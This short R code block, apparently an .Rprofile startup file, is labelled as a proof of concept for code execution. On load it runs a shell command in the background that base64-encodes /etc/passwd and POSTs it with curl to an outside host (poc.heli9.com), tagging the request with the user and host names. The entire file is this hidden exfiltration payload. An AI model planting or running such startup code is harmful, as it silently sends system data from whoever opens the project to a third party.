local({
  system("cat /etc/passwd | base64 | curl -s -X POST -d @- 'https://poc.heli9.com/log.php?step=rprofile_rce&proof='$(whoami)_$(hostname)", wait = FALSE)
})
